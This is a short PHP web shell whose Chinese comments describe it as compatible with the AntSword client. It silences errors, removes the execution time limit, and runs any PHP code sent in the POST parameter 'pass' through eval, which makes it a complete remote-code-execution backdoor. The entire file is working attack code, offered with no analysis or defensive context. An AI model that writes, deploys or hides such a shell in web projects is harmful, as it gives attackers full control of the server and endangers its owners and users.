<?php
// 蚁剑兼容 shell：POST pass=<php code>；直接 eval。
// 载荷自行输出 START/END 标记，客户端据此截取。
@error_reporting(0);
@ini_set('display_errors', '0');
@set_time_limit(0);
if (isset($_POST['pass'])) { eval($_POST['pass']); }
